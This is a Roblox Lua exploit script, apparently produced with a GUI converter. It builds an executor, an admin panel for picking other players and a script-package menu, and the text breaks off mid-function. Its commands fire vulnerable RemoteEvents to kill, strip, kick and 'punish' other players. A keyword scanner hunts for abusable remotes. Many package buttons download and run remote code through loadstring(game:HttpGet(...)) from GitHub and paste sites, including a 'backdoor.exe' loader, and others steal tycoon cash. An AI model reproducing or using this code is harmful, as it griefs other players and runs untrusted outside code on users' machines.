TextLabel.Size = UDim2.new(0, 415, 0, 18)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.LineHeight = 1.170
TextLabel.Text = "Click or press ; to enter a command."
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 13.000
TextLabel.TextXAlignment = Enum.TextXAlignment.Left

navigate_next.Name = "navigate_next"
navigate_next.Parent = TextLabel
navigate_next.BackgroundTransparency = 1.000
navigate_next.LayoutOrder = 13
navigate_next.Position = UDim2.new(-0.0570844896, 0, 0.0119052464, 0)
navigate_next.Size = UDim2.new(0, 24, 0, 17)
navigate_next.ZIndex = 2
navigate_next.Image = "rbxassetid://3926305904"
navigate_next.ImageRectOffset = Vector2.new(444, 844)
navigate_next.ImageRectSize = Vector2.new(36, 36)

AdminPanel.Name = "AdminPanel"
AdminPanel.Parent = Frame
AdminPanel.BackgroundColor3 = Color3.fromRGB(36, 35, 36)
AdminPanel.BorderSizePixel = 0
AdminPanel.Position = UDim2.new(0.211046755, 0, 0.150033444, 0)
AdminPanel.Size = UDim2.new(0, 334, 0, 197)
AdminPanel.Visible = false

AdminFrame.Name = "AdminFrame"
AdminFrame.Parent = AdminPanel
AdminFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AdminFrame.BackgroundTransparency = 1.000
AdminFrame.Position = UDim2.new(0.0179640725, 0, 0.0507614203, 0)
AdminFrame.Size = UDim2.new(0, 209, 0, 184)

ScrollingFrame_2.Parent = AdminFrame
ScrollingFrame_2.Active = true
ScrollingFrame_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScrollingFrame_2.BackgroundTransparency = 1.000
ScrollingFrame_2.BorderSizePixel = 0
ScrollingFrame_2.Size = UDim2.new(0, 208, 0, 184)
ScrollingFrame_2.BottomImage = ""
ScrollingFrame_2.MidImage = ""
ScrollingFrame_2.TopImage = ""

UIGridLayout_2.Parent = ScrollingFrame_2
UIGridLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout_2.CellSize = UDim2.new(0, 100, 0, 30)
UIGridLayout_2.StartCorner = Enum.StartCorner.BottomLeft

ExampleCMD.Name = "ExampleCMD"
ExampleCMD.Parent = SecrectServicePanelFoldr
ExampleCMD.BackgroundColor3 = Color3.fromRGB(53, 52, 53)
ExampleCMD.BorderSizePixel = 0
ExampleCMD.Position = UDim2.new(0.00834664889, 0, 0.0630109012, 0)
ExampleCMD.Size = UDim2.new(0, 82, 0, 26)
ExampleCMD.Font = Enum.Font.SourceSans
ExampleCMD.Text = "Example"
ExampleCMD.TextColor3 = Color3.fromRGB(255, 255, 255)
ExampleCMD.TextSize = 13.000
ExampleCMD.TextXAlignment = Enum.TextXAlignment.Left

PlayersFrame.Name = "PlayersFrame"
PlayersFrame.Parent = AdminPanel
PlayersFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
PlayersFrame.BackgroundTransparency = 1.000
PlayersFrame.Position = UDim2.new(0.646706581, 0, 0.0558375642, 0)
PlayersFrame.Size = UDim2.new(0, 112, 0, 184)

ScrollingFrame_3.Parent = PlayersFrame
ScrollingFrame_3.Active = true
ScrollingFrame_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScrollingFrame_3.BackgroundTransparency = 1.000
ScrollingFrame_3.BorderColor3 = Color3.fromRGB(36, 35, 36)
ScrollingFrame_3.BorderSizePixel = 2
ScrollingFrame_3.Size = UDim2.new(0, 113, 0, 184)
ScrollingFrame_3.BottomImage = ""
ScrollingFrame_3.CanvasSize = UDim2.new(0, 0, 15, 0)
ScrollingFrame_3.ScrollBarThickness = 1
ScrollingFrame_3.TopImage = ""

UIGridLayout_3.Parent = ScrollingFrame_3
UIGridLayout_3.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout_3.CellSize = UDim2.new(0, 120, 0, 30)
UIGridLayout_3.StartCorner = Enum.StartCorner.BottomLeft

ExamplePlrs.Name = "ExamplePlrs"
ExamplePlrs.Parent = ScrollingFrame_3
ExamplePlrs.BackgroundColor3 = Color3.fromRGB(66, 64, 66)
ExamplePlrs.BackgroundTransparency = 0.700
ExamplePlrs.BorderSizePixel = 0
ExamplePlrs.Size = UDim2.new(0, 200, 0, 50)
ExamplePlrs.Visible = false
ExamplePlrs.Font = Enum.Font.SourceSans
ExamplePlrs.Text = "pipeman"
ExamplePlrs.TextColor3 = Color3.fromRGB(255, 255, 255)
ExamplePlrs.TextSize = 14.000

TextButton_2.Parent = Frame
TextButton_2.BackgroundColor3 = Color3.fromRGB(53, 52, 53)
TextButton_2.BorderSizePixel = 0
TextButton_2.Position = UDim2.new(0.47963801, 0, 0.0641509444, 0)
TextButton_2.Size = UDim2.new(0, 206, 0, 22)
TextButton_2.Font = Enum.Font.SourceSans
TextButton_2.Text = "Admin Panel"
TextButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_2.TextSize = 14.000

refresh.Name = "refresh"
refresh.Parent = Frame
refresh.BackgroundTransparency = 1.000
refresh.Position = UDim2.new(0.959718883, 0, 0.0717624426, 0)
refresh.Size = UDim2.new(0, 16, 0, 17)
refresh.ZIndex = 2
refresh.Image = "rbxassetid://3926307971"
refresh.ImageRectOffset = Vector2.new(404, 84)
refresh.ImageRectSize = Vector2.new(36, 36)

Executor.Name = "Executor"
Executor.Parent = Frame
Executor.BackgroundColor3 = Color3.fromRGB(36, 35, 36)
Executor.BorderSizePixel = 0
Executor.Position = UDim2.new(0.206224695, 0, 0.153291643, 0)
Executor.Size = UDim2.new(0, 334, 0, 195)
Executor.ZIndex = 20

TextButton_3.Parent = Executor
TextButton_3.BackgroundColor3 = Color3.fromRGB(53, 52, 53)
TextButton_3.BorderSizePixel = 0
TextButton_3.Position = UDim2.new(0.00342089264, 0, 0.8696419, 0)
TextButton_3.Size = UDim2.new(0, 168, 0, 23)
TextButton_3.Font = Enum.Font.SourceSans
TextButton_3.Text = "Execute"
TextButton_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_3.TextSize = 14.000

TextButton_4.Parent = Executor
TextButton_4.BackgroundColor3 = Color3.fromRGB(53, 52, 53)
TextButton_4.BorderSizePixel = 0
TextButton_4.Position = UDim2.new(0.503420889, 0, 0.869642198, 0)
TextButton_4.Size = UDim2.new(0, 157, 0, 23)
TextButton_4.Font = Enum.Font.SourceSans
TextButton_4.Text = "Clear"
TextButton_4.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_4.TextSize = 14.000

TextBox_2.Parent = Executor
TextBox_2.BackgroundColor3 = Color3.fromRGB(50, 49, 50)
TextBox_2.BorderSizePixel = 0
TextBox_2.Position = UDim2.new(0.00299401209, 0, -0.00507614203, 0)
TextBox_2.Size = UDim2.new(0, 324, 0, 170)
TextBox_2.Font = Enum.Font.SourceSans
TextBox_2.MultiLine = true
TextBox_2.ClearTextOnFocus = false
TextBox_2.Text = ""
TextBox_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox_2.TextSize = 14.000
TextBox_2.TextXAlignment = Enum.TextXAlignment.Left
TextBox_2.TextYAlignment = Enum.TextYAlignment.Top

Frame_3.Parent = Executor
Frame_3.BackgroundColor3 = Color3.fromRGB(50, 49, 50)
Frame_3.BorderSizePixel = 0
Frame_3.Size = UDim2.new(0, 14, 0, 171)
Frame_3.Visible = false

UIListLayout.Parent = Frame_3
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

Frame_4.Parent = Frame
Frame_4.BackgroundColor3 = Color3.fromRGB(56, 56, 56)
Frame_4.BorderSizePixel = 0
Frame_4.Position = UDim2.new(-0.000358005753, 0, 0.152203158, 0)
Frame_4.Size = UDim2.new(0, 92, 0, 197)

packages.Name = "packages"
packages.Parent = Frame
packages.BackgroundColor3 = Color3.fromRGB(70, 69, 70)
packages.BorderSizePixel = 0
packages.Position = UDim2.new(0.00517658424, 0, 0.178197145, 0)
packages.Size = UDim2.new(0, 88,0, 28)
packages.Font = Enum.Font.SourceSans
packages.Text = "Packages"
packages.TextColor3 = Color3.fromRGB(255, 255, 255)
packages.TextSize = 18.000
packages.TextWrapped = true

-- Scripts:

local function KNZX_fake_script() -- TextBox.LocalScript 
	local script = Instance.new('LocalScript', TextBox)

	local searchBar = script.Parent
	local scrolllFrame = script.Parent.Parent

	function updateSearch()
		for i,button in pairs(scrolllFrame:GetChildren()) do
			if button:IsA("TextButton") then
				local searchText = string.lower(searchBar.Text)
				if searchText ~= "" then
					local buttonText = string.lower(button.Text)
					if string.find(buttonText, searchText) then
						button.Visible = true			
					else
						button.Visible = false
					end
				else
					button.Visible = true
				end
			end
		end
	end

	searchBar:GetPropertyChangedSignal("Text"):Connect(updateSearch)
end
coroutine.wrap(KNZX_fake_script)()
local function SGMWI_fake_script() -- TextButton.LocalScript 
	local script = Instance.new('LocalScript', TextButton)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.AdminPanel.Visible = false
		script.Parent.Parent.Packages.Visible = false
		script.Parent.Parent.Executor.Visible = true
	end)
end
coroutine.wrap(SGMWI_fake_script)()
local function SXSMBHB_fake_script() -- close.LocalScript 
	local script = Instance.new('LocalScript', close)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent:Destroy()
	end)
end
coroutine.wrap(SXSMBHB_fake_script)()
local function AQRU_fake_script() -- remove.LocalScript 
	local script = Instance.new('LocalScript', remove)

	script.Parent.MouseButton1Click:Connect(function()
		if script.Parent.Parent.refresh.Visible == true then
			for i,v in pairs(script.Parent.Parent:GetChildren()) do
				if v.Name == "remove" or v.Name == "close" or v.Name == "NameLabel" then
					script.Parent.Parent.Size = UDim2.new(0, 442, 0, 16)
				else
					if v.ClassName ~= "LocalScript" then
						v.Visible = false
					end
				end
			end
		else
			for i,v in pairs(script.Parent.Parent:GetChildren()) do
				if v.Name == "remove" or v.Name == "close" or v.Name == "NameLabel" then
					script.Parent.Parent.Size = UDim2.new(0, 442, 0, 265)
				else
					if v.ClassName ~= "LocalScript" then
						v.Visible = true
					end 
				end
			end
		end
	end)
end
coroutine.wrap(AQRU_fake_script)()
local function ZOMFSSU_fake_script() -- Frame.Dragify 
	local script = Instance.new('LocalScript', Frame)

	local UIS = game:GetService("UserInputService")
	function dragify(Frame)
		dragToggle = nil
		local dragSpeed = 0.50
		dragInput = nil
		dragStart = nil
		local dragPos = nil
		function updateInput(input)
			local Delta = input.Position - dragStart
			local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
			game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.30), {Position = Position}):Play()
		end
		Frame.InputBegan:Connect(function(input)
			if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
				dragToggle = true
				dragStart = input.Position
				startPos = Frame.Position
				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						dragToggle = false
					end
				end)
			end
		end)
		Frame.InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				dragInput = input
			end
		end)
		game:GetService("UserInputService").InputChanged:Connect(function(input)
			if input == dragInput and dragToggle then
				updateInput(input)
			end
		end)
	end

	dragify(script.Parent)
end
coroutine.wrap(ZOMFSSU_fake_script)()
local function FLYT_fake_script() -- ExampleCMD.LocalScript 
	local script = Instance.new('LocalScript', ExampleCMD)

	script.Parent.MouseButton1Click:Connect(function()
		--size changer
	end)
end
coroutine.wrap(FLYT_fake_script)()
local function GKOVJ_fake_script() -- ScrollingFrame_3.LocalScript 
	local script = Instance.new('LocalScript', ScrollingFrame_3)

	for i,v in pairs(game:GetService("Players"):GetChildren()) do
		if v:IsA("Player") then
			--local NewPlayer = Instance.new("TextButton",script.Parent)
			--NewPlayer.Active = true
			--NewPlayer.AutoButtonColor = true
			--NewPlayer.BackgroundColor3 = Color3.new(66,64,66)
			--NewPlayer.BackgroundTransparency = 0.7
			--NewPlayer.BorderSizePixel = 0
			--NewPlayer.Name = v.Name
			--NewPlayer.Visible = true
			--NewPlayer.Text = v.Name
			--NewPlayer.TextColor3 = Color3.new(255,255,255)
			--NewPlayer.TextScaled = true
			--NewPlayer.TextWrapped = true
			local NewPlayer = script.Parent.ExamplePlrs:Clone()
			NewPlayer.Name = v.Name
			NewPlayer.Text = v.Name
			NewPlayer.Parent = script.Parent
			NewPlayer.Visible = true
			NewPlayer.MouseButton1Click:Connect(function()
				Player.Value = NewPlayer.Text
			end)
		end
	end
end
coroutine.wrap(GKOVJ_fake_script)()
local function EHNJJIG_fake_script() -- TextButton_2.LocalScript 
	local script = Instance.new('LocalScript', TextButton_2)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.AdminPanel.Visible = true
		script.Parent.Parent.Packages.Visible = false
		script.Parent.Parent.Executor.Visible = false
	end)
end
coroutine.wrap(EHNJJIG_fake_script)()
local function QRUYCIJ_fake_script() -- refresh.LocalScript 
	local script = Instance.new('LocalScript', refresh)

	script.Parent.MouseButton1Click:Connect(function()
		for i,v in pairs(script.Parent.Parent.AdminPanel.PlayersFrame:GetChildren()) do
			if v:IsA("TextButton") then
				if v.Name == "ExamplePlrs" then
					-- none
				else
					v:Destroy()
				end
			end
		end

		for i,v in pairs(game:GetService("Players"):GetChildren()) do
			if v:IsA("Player") then
				--local NewPlayer = Instance.new("TextButton",script.Parent)
				--NewPlayer.Active = true
				--NewPlayer.AutoButtonColor = true
				--NewPlayer.BackgroundColor3 = Color3.new(66,64,66)
				--NewPlayer.BackgroundTransparency = 0.7
				--NewPlayer.BorderSizePixel = 0
				--NewPlayer.Name = v.Name
				--NewPlayer.Visible = true
				--NewPlayer.Text = v.Name
				--NewPlayer.TextColor3 = Color3.new(255,255,255)
				--NewPlayer.TextScaled = true
				--NewPlayer.TextWrapped = true
				local NewPlayer = ExamplePlrs:Clone()
				NewPlayer.Name = v.Name
				NewPlayer.Text = v.Name
				NewPlayer.Parent = PlayersFrame.ScrollingFrame
				NewPlayer.Visible = true
				NewPlayer.MouseButton1Click:Connect(function()
					Player.Value = NewPlayer.Text
				end)
			end
		end
	end)
end
coroutine.wrap(QRUYCIJ_fake_script)()
local function SHGQSS_fake_script() -- TextButton_3.LocalScript 
	local script = Instance.new('LocalScript', TextButton_3)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(script.Parent.Parent.TextBox.Text)()
	end)
end
coroutine.wrap(SHGQSS_fake_script)()
local function LOFLOFC_fake_script() -- TextButton_4.LocalScript 
	local script = Instance.new('LocalScript', TextButton_4)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.TextBox.Text = " "
	end)
end
coroutine.wrap(LOFLOFC_fake_script)()
local function VQHBXP_fake_script() -- TextBox_2.LocalScript 
	local script = Instance.new('LocalScript', TextBox_2)

	--local t1, count = script.Parent.Text:gsub("\n", "")

	--for i = 0, count, 1 do
	--	local CurrentLine = Instance.new("TextBox",script.Parent.Parent.Frame)
	--	CurrentLine.BackgroundTransparency = 1
	--	CurrentLine.BorderSizePixel = 0
	--	CurrentLine.LayoutOrder = 0
	--	CurrentLine.Name = count
	--	CurrentLine.Size = UDim2.new(0, 16, 0, 12)
	--	CurrentLine.ZIndex = 100
	--	CurrentLine.TextColor3 = Color3.new(255,255,255)
	--	CurrentLine.TextScaled = true
	--	CurrentLine.TextWrapped = true
	--	CurrentLine.Text = count
	--	wait(1)
	--end
end
coroutine.wrap(VQHBXP_fake_script)()
local function IRDU_fake_script() -- packages.LocalScript 
	local script = Instance.new('LocalScript', packages)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.AdminPanel.Visible = false
		script.Parent.Parent.Packages.Visible = true
		script.Parent.Parent.Executor.Visible = false
	end)
end
coroutine.wrap(IRDU_fake_script)()
local function CreateCMD(name,callback)
	local NewCMD = ExampleCMD:Clone()
	NewCMD.Name = name
	NewCMD.Text = name
	NewCMD.Parent = ScrollingFrame_2
	NewCMD.MouseButton1Click:Connect(callback)
end
local function CreateScript(name,callback)
	local NewPackage = Example:Clone()
	NewPackage.Name = name
	NewPackage.Text = name
	NewPackage.Parent = ScrollingFrame
	NewPackage.MouseButton1Click:Connect(callback)
end

CreateCMD("kill",function()
	--[[
	    Simple vulnerability scanner v1.1
	    Made by 0fiiz#7952
    ]]--


	local load_BackdoorEXE = false
	local load_SimplySpy = false
	local load_DestroyToolTest = false

	if load_SimplySpy == true then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua%22"))()
	end

	if load_BackdoorEXE == true then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v8/src/main.lua%22"))()
	end

	local PingWords = {
		"destroy",
		"delete",
		"del",
		"place",
		"remove",
		"replicate",
		"loadstring",
		"rev",
		"admin",
		"create",
		"property",
		"spawn",
		"clear",
		"trash",
		"fire",
		"bomb",
		"explode",
		"color",
		"update",
		"car",
		"money",
		"cheat",
		"data",
		"save",
		"build",
		"backdoor",
		"invis",
		"hide",
		"set"
	}

	local PossibleRemotes = {}

	for i,v in pairs(game:GetDescendants()) do
		if v:IsA("RemoteEvent") then
			for x,z in pairs(PingWords) do
				if string.find(v.Name:lower(), z:lower()) then
					warn("Possible Vulnerability found : ".. v.Name.. " | "..v.ClassName)
					table.insert(PossibleRemotes, v)
				end
			end
		end
	end

	if load_DestroyToolTest == true then
		for i,v in pairs(PossibleRemotes) do
			v:FireServer(game:GetService("Players")[Player.Value].Character.Head)
		end
	end

	if game.PlaceId == 3554069044 then
		game:GetService("ReplicatedStorage").Events.Tools.ChangeParent:FireServer(game:GetService("Players")[Player.Value].Character.Head, game.JointsService)
	end
end)

CreateCMD("naked",function()
	if game.PlaceId == 3554069044 then
		game:GetService("ReplicatedStorage").Events.Tools.ChangeParent:FireServer(game:GetService("Players")[Player.Value].Character.Shirt, game.JointsService)
		game:GetService("ReplicatedStorage").Events.Tools.ChangeParent:FireServer(game:GetService("Players")[Player.Value].Character.Pants, game.JointsService)
	end
end)

CreateCMD("dupe head",function()
	--[[
	    Simple vulnerability scanner v1.1
	    Made by 0fiiz#7952
	]]--


	local load_BackdoorEXE = false
	local load_SimplySpy = false
	local load_DestroyToolTest = true

	if load_SimplySpy == true then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua%22"))()
	end

	if load_BackdoorEXE == true then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v8/src/main.lua%22"))()
	end

	local PingWords = {
		"destroy",
		"delete",
		"del",
		"place",
		"remove",
		"replicate",
		"loadstring",
		"rev",
		"admin",
		"create",
		"property",
		"spawn",
		"clear",
		"trash",
		"fire",
		"bomb",
		"explode",
		"color",
		"update",
		"car",
		"money",
		"cheat",
		"data",
		"save",
		"build",
		"backdoor",
		"invis",
		"hide",
		"set"
	}

	local PossibleRemotes = {}

	for i,v in pairs(game:GetDescendants()) do
		if v:IsA("RemoteEvent") then
			for x,z in pairs(PingWords) do
				if string.find(v.Name:lower(), z:lower()) then
					warn("Possible Vulnerability found : ".. v.Name.. " | "..v.ClassName)
					table.insert(PossibleRemotes, v)
				end
			end
		end
	end

	if load_DestroyToolTest == true then
		for i,v in pairs(PossibleRemotes) do
			v:FireServer(game:GetService("Players")[Player.Value].Character.Head)
		end
	end
end)

CreateCMD("dupe torso",function()
	--[[
	    Simple vulnerability scanner v1.1
	    Made by 0fiiz#7952
	]]--


	local load_BackdoorEXE = false
	local load_SimplySpy = false
	local load_DestroyToolTest = true

	if load_SimplySpy == true then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua%22"))()
	end

	if load_BackdoorEXE == true then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v8/src/main.lua%22"))()
	end

	local PingWords = {
		"destroy",
		"delete",
		"del",
		"place",
		"remove",
		"replicate",
		"loadstring",
		"rev",
		"admin",
		"create",
		"property",
		"spawn",
		"clear",
		"trash",
		"fire",
		"bomb",
		"explode",
		"color",
		"update",
		"car",
		"money",
		"cheat",
		"data",
		"save",
		"build",
		"backdoor",
		"invis",
		"hide",
		"set"
	}

	local PossibleRemotes = {}

	for i,v in pairs(game:GetDescendants()) do
		if v:IsA("RemoteEvent") then
			for x,z in pairs(PingWords) do
				if string.find(v.Name:lower(), z:lower()) then
					warn("Possible Vulnerability found : ".. v.Name.. " | "..v.ClassName)
					table.insert(PossibleRemotes, v)
				end
			end
		end
	end

	if load_DestroyToolTest == true then
		for i,v in pairs(PossibleRemotes) do
			v:FireServer(game:GetService("Players")[Player.Value].Character.Torso)
		end
	end
end)

CreateCMD("bombhead",function()
	--[[
	    Simple vulnerability scanner v1.1
	    Made by 0fiiz#7952
	]]--


	local load_BackdoorEXE = false
	local load_SimplySpy = false
	local load_DestroyToolTest = true

	if load_SimplySpy == true then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua%22"))()
	end

	if load_BackdoorEXE == true then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v8/src/main.lua%22"))()
	end

	local PingWords = {
		"destroy",
		"delete",
		"del",
		"place",
		"remove",
		"replicate",
		"loadstring",
		"rev",
		"admin",
		"create",
		"property",
		"spawn",
		"clear",
		"trash",
		"fire",
		"bomb",
		"explode",
		"color",
		"update",
		"car",
		"money",
		"cheat",
		"data",
		"save",
		"build",
		"backdoor",
		"invis",
		"hide",
		"set"
	}

	local PossibleRemotes = {}

	for i,v in pairs(game:GetDescendants()) do
		if v:IsA("RemoteEvent") then
			for x,z in pairs(PingWords) do
				if string.find(v.Name:lower(), z:lower()) then
					warn("Possible Vulnerability found : ".. v.Name.. " | "..v.ClassName)
					table.insert(PossibleRemotes, v)
				end
			end
		end
	end

	if load_DestroyToolTest == true then
		for i = 0, 100, 1 do
			for i,v in pairs(PossibleRemotes) do
				v:FireServer(game:GetService("Players")[Player.Value].Character.Head)
			end
		end
	end
end)

CreateCMD("bombtorso",function()
	--[[
	    Simple vulnerability scanner v1.1
	    Made by 0fiiz#7952
	]]--


	local load_BackdoorEXE = false
	local load_SimplySpy = false
	local load_DestroyToolTest = true

	if load_SimplySpy == true then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua%22"))()
	end

	if load_BackdoorEXE == true then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v8/src/main.lua%22"))()
	end

	local PingWords = {
		"destroy",
		"delete",
		"del",
		"place",
		"remove",
		"replicate",
		"loadstring",
		"rev",
		"admin",
		"create",
		"property",
		"spawn",
		"clear",
		"trash",
		"fire",
		"bomb",
		"explode",
		"color",
		"update",
		"car",
		"money",
		"cheat",
		"data",
		"save",
		"build",
		"backdoor",
		"invis",
		"hide",
		"set"
	}

	local PossibleRemotes = {}

	for i,v in pairs(game:GetDescendants()) do
		if v:IsA("RemoteEvent") then
			for x,z in pairs(PingWords) do
				if string.find(v.Name:lower(), z:lower()) then
					warn("Possible Vulnerability found : ".. v.Name.. " | "..v.ClassName)
					table.insert(PossibleRemotes, v)
				end
			end
		end
	end

	if load_DestroyToolTest == true then
		for i = 0, 100, 1 do
			for i,v in pairs(PossibleRemotes) do
				v:FireServer(game:GetService("Players")[Player.Value].Character.Torso)
			end
		end
	end
end)

CreateCMD("view",function()
	game:GetService("Workspace").CurrentCamera.CameraSubject = game:GetService("Players")[Player.Value].Character.Humanoid
end)

CreateCMD("unview",function()
	game:GetService("Workspace").CurrentCamera.CameraSubject = game:GetService("Players").LocalPlayer.Character.Humanoid
end)

CreateCMD("goto",function()
	game:GetService("Players").LocalPlayer.Character:PivotTo(game:GetService("Players")[Player.Value].Character:GetPivot())
end)

CreateCMD("info",function()
	local plr = game:GetService("Players")[Player.Value]
	print("--- INFO ---")
	print("Name: "..plr.Name)
	print("DisplayName: "..plr.DisplayName)
	print("Account Age: "..tostring(plr.AccountAge))
	print("Membership: "..tostring(plr.MembershipType))
	print("--- END. ---")
end)

CreateScript("RemoteTestTool",function()
	--[[
	    Simple vulnerability scanner v1.1
	    Made by 0fiiz#7952
	]]--


	local load_BackdoorEXE = false
	local load_SimplySpy = false
	local load_DestroyToolTest = true

	if load_SimplySpy == true then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua%22"))()
	end

	if load_BackdoorEXE == true then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v8/src/main.lua%22"))()
	end

	local PingWords = {
		"destroy",
		"delete",
		"del",
		"place",
		"remove",
		"replicate",
		"loadstring",
		"rev",
		"admin",
		"create",
		"property",
		"spawn",
		"clear",
		"trash",
		"fire",
		"bomb",
		"explode",
		"color",
		"update",
		"car",
		"money",
		"cheat",
		"data",
		"save",
		"build",
		"backdoor",
		"invis",
		"hide",
		"set"
	}

	local PossibleRemotes = {}

	for i,v in pairs(game:GetDescendants()) do
		if v:IsA("RemoteEvent") then
			for x,z in pairs(PingWords) do
				if string.find(v.Name:lower(), z:lower()) then
					warn("Possible Vulnerability found : ".. v.Name.. " | "..v.ClassName)
					table.insert(PossibleRemotes, v)
				end
			end
		end
	end
	
	if load_DestroyToolTest == true then
		removething("RTT Tool",game:GetService("Players").LocalPlayer.Backpack)
		
		local RemoteTestTool = Instance.new("Tool",game:GetService("Players").LocalPlayer.Backpack)
		RemoteTestTool.Name = "RTT Tool"
		RemoteTestTool.RequiresHandle = false
		RemoteTestTool.Activated:Connect(function()
			for i,v in pairs(PossibleRemotes) do
				v:FireServer(game:GetService("Players").LocalPlayer:GetMouse().Target)
			end
		end)
	end
end)

CreateCMD("kick",function()
game:GetService("ReplicatedStorage").Events.Tools.ChangeParent:FireServer(game:GetService("Players")[Player.Value])
end)

CreateCMD("punish",function()
game:GetService("ReplicatedStorage").Events.Tools.ChangeParent:FireServer(game:GetService("Players")[Player.Value].Character)
end)

Follow = false

CreateCMD("annoy",function()
	local p = game:GetService("Players")[Player.Value]
	if p.Character and p.Character:FindFirstChild("Humanoid") then
		if Follow == true then
			Follow = false; return
		else Follow = true end
		while Follow == true do
			game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = p.Character.HumanoidRootPart.CFrame
			wait()
		end
	end
end)

CreateCMD("unannoy",function()
Follow = false
end)

CreateScript("Infinite Yield Admin",function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
end)

CreateScript("Dex",function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
end)

CreateScript("Rekt Hub",function()
loadstring(game:HttpGet(("https://paste.website/p/fce88396-87e3-4ed8-bb8c-1593ff174d0d.txt"), true))()
end)

CreateScript("Red All",function()
loadstring(game:HttpGet(("https://paste.website/p/a6956ce1-5a86-4da8-887f-5f828b44dd0a.txt"), true))() -- Red all
end)

CreateScript("HD Admin Brickspam",function()
loadstring(game:HttpGet(("https://paste.website/p/fcfa5271-b26f-4611-bea6-9c369dc73546.txt"), true))() -- Hd brickspam
end)

CreateScript("Bread",function()
loadstring(game:HttpGet(("https://paste.website/p/67e65cf2-1afe-4467-b04c-5ec95566807c.txt"), true))() -- bread
end)

CreateScript("Bat Gui",function()
loadstring(game:HttpGet(("https://paste.website/p/cf170836-00b6-480f-b3a4-6170a4ed730f.txt"), true))() -- Bat gui
end)

CreateScript("Box Admin",function()
loadstring(game:HttpGet(("https://paste.website/p/166b9fb0-5ab6-4555-911d-0c7e4af9b608.txt"), true))() -- Box admin
end)

CreateScript("WeAreSkids",function()
loadstring(game:HttpGet(("https://paste.website/p/fb3f5729-dd7b-44af-a145-3badfffb755a.txt"), true))() -- WeAreSkids
end)

CreateScript("Redwood Ruinier",function()
loadstring(game:HttpGet(("https://paste.website/p/aff15b93-2531-4d9b-a62a-1108fd125e24.txt"), true))() -- red wood
end)

CreateScript("Tycoon Hax",function()
loadstring(game:HttpGet(("https://rawscripts.net/raw/Super-Hero-Tycoon-Haxx-9731"), true))()
end)

CreateScript("ScriptBlox Searcher",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/ScriptSearcher"))() -- not made by kosovo this time
end)

CreateScript("Steal Tycoon Cash",function()
	for f, g in pairs(game:GetService("Workspace"):GetDescendants()) do
         if g.Name == "Giver" then
             firetouchinterest(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart, g, 0)
             firetouchinterest(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart, g, 1)
         end
     end
end)

CreateScript("No Tycoon Doors",function()
	for f, g in pairs(game:GetService("Workspace"):GetDescendants()) do
       if g.Name == "Pipe" then
           g:Destroy()
       end
    end
end)

CreateScript("Delete Roleplay Tool",function()
	mouse = game:GetService("Players").LocalPlayer:GetMouse()
	tool = Instance.new("Tool")
	tool.RequiresHandle = false
	tool.Name = "Delete tool"
	tool.Activated:Connect(function()
	game:GetService("ReplicatedStorage").Events.Tools.ChangeParent:FireServer(mouse.Target)
	end)
	tool.Parent = game:GetService("Players").LocalPlayer.Backpack
end)

CreateScript("Kill Roleplay Tool",function()
	mouse = game:GetService("Players").LocalPlayer:GetMouse()
	tool = Instance.new("Tool")
	tool.RequiresHandle = false
	tool.Name = "Kill tool"
	tool.Activated:Connect(function()
	if mouse.Target.Parent:FindFirstChild("Humanoid") then
